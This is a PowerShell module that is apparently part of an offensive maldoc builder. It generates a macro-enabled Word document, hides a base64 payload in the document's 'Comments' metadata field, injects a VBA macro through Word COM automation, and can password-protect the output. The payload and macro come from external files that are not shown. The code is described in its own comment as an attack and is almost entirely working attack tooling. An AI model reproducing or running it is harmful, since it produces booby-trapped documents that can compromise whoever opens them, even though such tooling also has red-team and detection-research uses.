Import-Module $PSScriptRoot\..\..\internals\utils.psm1
Import-Module $PSScriptRoot\..\..\internals\tools.psm1

<#

This attack takes advantage of the built in document properties. More specifically, the "Comments"
field.

A template is not required as this builder will create its own document and modify the coreProperties
to include the specified payload.

The payload needs to be a base64 encoded string

#>
function Build() {
    param(
        [Parameter(mandatory=$true)]
        [String]
        $out,

        [Parameter(mandatory=$false)]
        [String]
        $pass
    )

    CreateFreshDocument -out "$PSScriptRoot"
    Rename-Item -Path "$PSScriptRoot\Doc1.docm" -NewName "$PSScriptRoot\Doc1.zip"
    Expand-Archive -LiteralPath "$PSScriptRoot\Doc1.zip" -DestinationPath "$PSScriptRoot\Doc1"
    Remove-Item -Path "$PSScriptRoot\Doc1.zip"

    $payload = [System.IO.File]::ReadAllText("$PSScriptRoot\payloads.txt")
    [xml]$coreProperties = Get-Content -Path "$PSScriptRoot\Doc1\docProps\core.xml"
    $coreProperties.coreProperties.description = "$payload"
    $coreProperties.Save("$PSScriptRoot\Doc1\docProps\core.xml")
    
    Compress-Archive -LiteralPath "$PSScriptRoot\Doc1\[Content_Types].xml", 
        "$PSScriptRoot\Doc1\word\", 
        "$PSScriptRoot\Doc1\docProps\", 
        "$PSScriptRoot\Doc1\_rels\" -DestinationPath "$PSScriptRoot\Doc1.zip"

    Remove-Item -Path "$PSScriptRoot\Doc1" -Recurse
    Rename-Item -Path "$PSScriptRoot\Doc1.zip" -NewName "$PSScriptRoot\Doc1.docm"

    $wdApp = New-Object -COMObject "Word.Application"
    $wdApp.Visible = $false

    $fname = "$PSScriptRoot\Doc1.docm"

    $wdDoc = $wdApp.documents.open($fname)

    $vbaModule = $wdDoc.VBProject.VBComponents.Add(1)

    $macro = BuildMacro
    $vbaModule.CodeModule.AddFromString($macro) | Out-Null

    # 13 is needed for docm
    # https://docs.microsoft.com/en-us/office/vba/api/Word.WdSaveFormat
    if (!$pass) {
        $wdDoc.SaveAs($out, 13)
        $wdDoc.Close()
        $wdApp.Quit()
    } else {
        $wdDoc.SaveAs($out, 13, 0, $pass)
        $wdDoc.Close()
        $wdApp.Quit()
    } 

    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdDoc) | Out-Null
    [System.Runtime.Interopservices.Marshal]::ReleaseComObject($wdApp) | Out-Null
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()

    Remove-Variable wdDoc
    Remove-Variable wdApp

}

function BuildMacro() {

    $macro = [System.IO.File]::ReadAllText("$PSScriptRoot\macro.txt")

    return $macro

}